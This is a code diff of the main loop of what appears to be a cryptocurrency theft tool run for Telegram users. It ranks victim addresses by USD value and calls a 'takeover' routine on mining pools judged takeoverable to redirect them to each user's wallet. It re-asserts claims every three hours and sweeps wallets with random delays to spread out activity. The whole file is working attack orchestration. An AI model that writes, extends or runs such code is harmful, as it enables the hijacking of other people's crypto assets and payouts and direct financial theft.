@@ -1,21 +1,24 @@
 """Main loop: discover, rank, hijack highest value first, re-assert, sweep."""
 import asyncio, random, time
 from . import db, hijack, hunter, sweeper
-from .pools import by_id
+from .pools import by_id, takeoverable
 
 REASSERT = 3 * 3600
 RETRY = 40 * 60
+PER_PASS = 25
+SWEEP_GAP = (2, 5)
 
 async def hijack_pass():
     users = db.all("SELECT * FROM users WHERE active=1 AND auto=1")
     for u in users:
-        wallet = u["evm"] if u["evm"] else None
+        wallet = u["evm"]
         if not wallet:
             continue
         rows = db.all("""SELECT t.*, c.state, c.ts AS cts FROM targets t
                          LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
-                         WHERE t.usd >= ? AND t.chain IN ('eth','bnb','etc')
-                         ORDER BY t.score DESC LIMIT 25""", (u["tg_id"], u["min_usd"]))
+                         WHERE t.usd >= ? AND t.coin IN ('eth','bnb','etc')
+                         ORDER BY t.score DESC, t.usd DESC LIMIT ?""",
+                      (u["tg_id"], u["min_usd"], PER_PASS))
         for t in rows:
             st, ts = t["state"], t["cts"] or 0
             if st == "ok" and time.time() - ts < REASSERT:
@@ -23,10 +26,10 @@ async def hijack_pass():
             if st == "fail" and time.time() - ts < RETRY:
                 continue
             spec = by_id(t["pool"])
-            if not spec:
+            if not takeoverable(spec):
                 continue
             state, note = await hijack.takeover(spec, t["address"], wallet,
-                                                lambda m, i=t["id"]: db.log(m, u["tg_id"]))
+                                                lambda m: db.log(m, u["tg_id"]))
             db.run("""INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
                       ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
                       ts=excluded.ts, note=excluded.note""",
@@ -40,11 +43,10 @@ async def sweep_pass():
                        WHERE u.active=1 AND u.evm IS NOT NULL"""):
         st, note = await sweeper.sweep(w, w["evm"])
         if st not in ("empty", "skip"):
-            await asyncio.sleep(random.uniform(2, 5))
+            await asyncio.sleep(random.uniform(*SWEEP_GAP))
 
 async def loop():
     await asyncio.sleep(5)
-    tick = 0
     while True:
         try:
             await hunter.cycle()
@@ -53,5 +55,4 @@ async def loop():
                 await sweep_pass()
         except Exception as e:
             db.log(f"loop error {type(e).__name__}: {e}", lvl="error")
-        tick += 1
         await asyncio.sleep(90 + random.randint(0, 40))
